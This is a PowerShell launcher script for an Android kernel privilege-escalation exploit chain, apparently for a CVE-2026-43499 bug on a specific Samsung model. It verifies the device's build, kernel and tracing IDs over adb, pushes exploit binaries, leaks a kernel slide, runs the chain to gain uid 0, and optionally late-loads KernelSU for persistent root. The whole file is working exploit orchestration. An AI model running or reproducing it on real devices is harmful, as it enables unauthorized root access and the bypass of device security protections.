param(
    [string]$Serial,
    [string]$Profile = "a536e-a536exxsngzg3",
    [string]$Artifacts = (Join-Path $PSScriptRoot "..\exploit\out"),
    [string]$KsudPath,
    [switch]$RootOnly,
    [switch]$Reboot
)

$ErrorActionPreference = "Stop"
$adb = (Get-Command adb -ErrorAction Stop).Source
$device = if ($Serial) { @("-s", $Serial) } else { @() }

function Restart-Adb {
    Get-Process adb -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 2
    & $adb start-server | Out-Null
    Start-Sleep -Seconds 1
}

function Invoke-Adb {
    $savedErrorAction = $ErrorActionPreference
    $ErrorActionPreference = "Continue"
    try {
        $result = & $adb @device @args 2>&1
        $exitCode = $LASTEXITCODE
    } finally {
        $ErrorActionPreference = $savedErrorAction
    }
    $text = $result -join "`n"
    if ($exitCode -ne 0 -and $text -match "daemon not running|cannot connect to daemon|failed to start daemon|could not read ok from ADB Server|no devices|offline") {
        Restart-Adb
        $savedErrorAction = $ErrorActionPreference
        $ErrorActionPreference = "Continue"
        try {
            $result = & $adb @device @args 2>&1
            $exitCode = $LASTEXITCODE
        } finally {
            $ErrorActionPreference = $savedErrorAction
        }
    }
    if ($exitCode -ne 0) { throw "adb failed: $($result -join "`n")" }
    return ($result -join "`n")
}

if (-not $Serial) {
    $online = @(& $adb devices | Select-String "`tdevice$")
    if ($online.Count -ne 1) { throw "need one adb device, or pass -Serial" }
}

$profileFile = Join-Path $PSScriptRoot "..\exploit\profiles\$Profile\target.env"
$target = @{}
Get-Content $profileFile | ForEach-Object {
    $key, $value = $_ -split "=", 2
    $target[$key] = $value
}

if ($Reboot) { Invoke-Adb reboot | Out-Null }
Invoke-Adb wait-for-device | Out-Null
$deadline = (Get-Date).AddMinutes(6)
do {
    $boot = (Invoke-Adb shell getprop sys.boot_completed).Trim()
    $deviceBoot = (Invoke-Adb shell getprop dev.bootcomplete).Trim()
    $bootAnim = (Invoke-Adb shell getprop init.svc.bootanim).Trim()
    $userData = (Invoke-Adb shell getprop sys.user.0.ce_available).Trim()
    if ($boot -eq "1" -and $deviceBoot -eq "1" -and $bootAnim -eq "stopped" -and $userData -eq "true") { break }
    Start-Sleep -Seconds 3
} while ((Get-Date) -lt $deadline)
if ($boot -ne "1" -or $deviceBoot -ne "1" -or $bootAnim -ne "stopped" -or $userData -ne "true") {
    throw "boot did not finish or user data is locked; unlock the phone"
}
Start-Sleep -Seconds 30

$actualModel = (Invoke-Adb shell getprop ro.product.model).Trim()
$actualBuild = (Invoke-Adb shell getprop ro.build.version.incremental).Trim()
$actualKernel = (Invoke-Adb shell uname -r).Trim()
$actualTrace = (Invoke-Adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id).Trim()
if ($actualModel -ne $target.TARGET_MODEL) { throw "wrong model: $actualModel" }
if ($actualBuild -ne $target.TARGET_BUILD) { throw "wrong build: $actualBuild" }
if ($actualKernel -ne $target.TARGET_KERNEL_RELEASE) { throw "wrong kernel: $actualKernel" }
if ($actualTrace -ne $target.TRACE_EVENT_ID) { throw "wrong sched trace id: $actualTrace" }

$modules = Invoke-Adb shell cat /proc/modules
if ($modules -match "(?m)^kernelsu ") {
    $suState = Invoke-Adb shell "/system/bin/su -c id"
    throw "KernelSU is already live: $suState. Reboot before running the exploit again."
}

$localWrite = Join-Path $Artifacts "cve-2026-43499-write"
$localBridge = Join-Path $Artifacts "cve-2026-43499-bridge"
$localRoot = Join-Path $Artifacts "cve-2026-43499-root"
foreach ($path in @($localWrite, $localBridge, $localRoot)) {
    if (-not (Test-Path $path -PathType Leaf)) { throw "missing artifact: $path" }
}

$remoteWrite = "/data/local/tmp/rmg-write"
$remoteBridge = "/data/local/tmp/rmg-bridge"
$remoteRoot = "/data/local/tmp/rmg-root"
$remoteLog = "/data/local/tmp/rmg-chain.log"
Invoke-Adb push $localWrite $remoteWrite | Out-Null
Invoke-Adb push $localBridge $remoteBridge | Out-Null
Invoke-Adb push $localRoot $remoteRoot | Out-Null
Invoke-Adb shell chmod 755 $remoteWrite $remoteBridge $remoteRoot | Out-Null

$killStale = 'for name in rmg-bridge rmg-write; do for pid in $(pidof $name); do kill $pid; done; done'
Invoke-Adb shell $killStale | Out-Null

$slideOut = Invoke-Adb shell "$remoteWrite slide"
$match = [regex]::Match($slideOut, "physical slide=(0x[0-9a-fA-F]+|[0-9]+)")
if (-not $match.Success) { throw "slide not found: $slideOut" }
$slide = $match.Groups[1].Value
Invoke-Adb shell ": > $remoteLog; $remoteBridge chain $slide $remoteWrite > $remoteLog 2>&1 &" | Out-Null

$rootOk = $false
for ($i = 0; $i -lt 90; $i++) {
    Start-Sleep -Seconds 1
    $log = Invoke-Adb shell cat $remoteLog
    if ($log -match "ROOT_OK") { $rootOk = $true; break }
    if ($log -match "CHAIN_FAIL|ARW_FAIL|ROOT_FAIL") { break }
}
if (-not $rootOk) { throw "root chain failed: $log" }
$id = Invoke-Adb shell "$remoteRoot -c id"
if ($id -notmatch "uid=0") { throw "root check failed: $id" }

if ($RootOnly) {
    Write-Host "shell root ok: $id"
    return
}

$actualPageAlloc = (Invoke-Adb shell "$remoteRoot -c 'cat /sys/kernel/tracing/events/kmem/mm_page_alloc/id'").Trim()
$actualCacheAlloc = (Invoke-Adb shell "$remoteRoot -c 'cat /sys/kernel/tracing/events/kmem/kmem_cache_alloc/id'").Trim()
if ($actualPageAlloc -ne $target.MM_PAGE_ALLOC_ID) { throw "wrong page trace id: $actualPageAlloc" }
if ($actualCacheAlloc -ne $target.KMEM_CACHE_ALLOC_ID) { throw "wrong cache trace id: $actualCacheAlloc" }
Write-Host "shell root ok: $id"

if (-not $KsudPath) { return }
if (-not (Test-Path $KsudPath -PathType Leaf)) { throw "missing ksud: $KsudPath" }
$remoteKsud = "/data/local/tmp/rmg-ksud"
Invoke-Adb push $KsudPath $remoteKsud | Out-Null
Invoke-Adb shell chmod 755 $remoteKsud | Out-Null
$remoteStage = "/data/local/tmp/.ksud-stage"
Invoke-Adb push $KsudPath $remoteStage | Out-Null
Invoke-Adb shell chmod 755 $remoteStage | Out-Null
Write-Host "late-loading KernelSU"
$load = Invoke-Adb shell "$remoteRoot --late-load"
Write-Host $load
Start-Sleep -Seconds 2
$modules = Invoke-Adb shell "/system/bin/su -c 'cat /proc/modules'"
if ($modules -notmatch "(?m)^kernelsu ") { throw "KernelSU module is not live" }
$suId = Invoke-Adb shell "/system/bin/su -c id"
if ($suId -notmatch "uid=0") { throw "KernelSU su failed: $suId" }
Write-Host "KernelSU root ok: $suId"
